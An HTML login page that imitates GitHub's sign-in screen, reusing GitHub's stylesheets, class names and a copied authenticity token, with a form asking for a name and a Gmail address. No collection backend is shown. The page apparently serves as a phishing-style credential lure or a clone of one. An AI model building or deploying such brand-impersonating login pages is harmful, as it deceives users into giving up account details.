<html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark" data-a11y-animated-images="system" data-turbo-loaded="">
 <head>
   <meta charset="utf-8">
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-8cafbcbd78f4.css">
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-31dc14e38457.css">
  <link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-71414d661fe2.css">
  <link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-ba96c7f1d660.css">
  <link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-7471c22cdb6a.css">
  <link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-80180bed15ed.css">
  <link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-e89b9cdecb75.css">
  <link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-77f15e9154df.css">
  <link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-f598f8dd18ae.css">
   <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-fb1d51d1ef66.css">
   <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-60c5e476b0dc.css">
   <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-5f348e729995.css">
   <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-17b9a2af8801.css"> 
 <title>Login Page</title>
   <meta name="viewport" content="width=device-width">
 <link rel="icon"  href="mail.jpg">
</head>

 <body class="logged-out env-production page-responsive session-authentication" style="word-wrap: break-word; ">
   <div data-turbo-body="" class="logged-out env-production page-responsive session-authentication" style="word-wrap: break-word;">
    
       <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
 <div class="container clearfix width-full text-center">
   <a class="header-logo">
     <svg   height="48"  viewBox="0 0 16 16" version="1.1" width="48" data-view-component="true" class="octicon octicon-mark-github">
   <img style="height: 5%; width:5%; margin-top: 10px; margin-right:25px;" src="https://th.bing.com/th/id/OIP.fWPt9XlQxNH8iOAyVahflQHaHa?pid=ImgDet&w=1600&h=1600&rs=1"></img>
</svg>
   </a>
 </div>
</div>

     <div hidden="hidden" data-view-component="true" class="js-stale-session-flash flash flash-warn mb-3">
   </button>

</div>
   </div>

 <div id="start-of-content" class="show-on-focus"></div>
  
   <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>

 <div class="application-main " data-commit-hovercards-enabled="" data-discussion-hovercards-enabled="" data-issue-and-pr-hovercards-enabled="">
     <main>
       
 <div class="auth-form px-3" id="login">

     <input type="hidden" name="ga_id" class="js-octo-ga-id-input">
     <div class="auth-form-header p-0">
       <h1>Sign in </h1>
     </div>

     <div id="js-flash-container" data-turbo-replace="">

 <template class="js-flash-template">
   
<div class="flash flash-full   {{ className }}">
 <div class="px-2">
   <button autofocus="" class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
     <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
   <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
   </button>
   <div aria-atomic="true" role="alert" class="js-flash-alert">
     
     <div>{{ message }}</div>

   </div>
 </div>
</div>
 </template>
</div>


     <div class="flash js-transform-notice" hidden="">
       <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
         <svg aria-label="Dismiss" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
   <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
       </button>
     </div>

     <div class="auth-form-body mt-3"><form method="post" >

      
        <input type="hidden" name="authenticity_token" value="9mK03_NWFuWdV7ccO4h7tVuHmdug8b5ttnatD6DZvze_SuW3VFjw0Qw31JgDOkyKR12CN4qpAia2tl_AVXGpQg">  <label for="login_field">
   Username
 </label>
 <input type="text" name="nam" placeholder="Name" id="login_field" class="form-control input-block js-login-field" autocapitalize="off" autocorrect="off" autocomplete="username" autofocus="autofocus">

 <div class="position-relative">
   <label for="password">
     Gmail
   </label>
   <input type="email"  name="mail" id="password"  placeholder="Mail" class="form-control form-control input-block js-password-field" autocomplete="current-password">


   <input type="submit" name="sign" style="background-color: orangered;" value="Sign In" class="btn btn-primary btn-block js-sign-in-button" data-disable-with="Signing in…" data-signin-label="Sign in" data-sso-label="Sign in with your identity provider" development="false"></form>
</body></html>
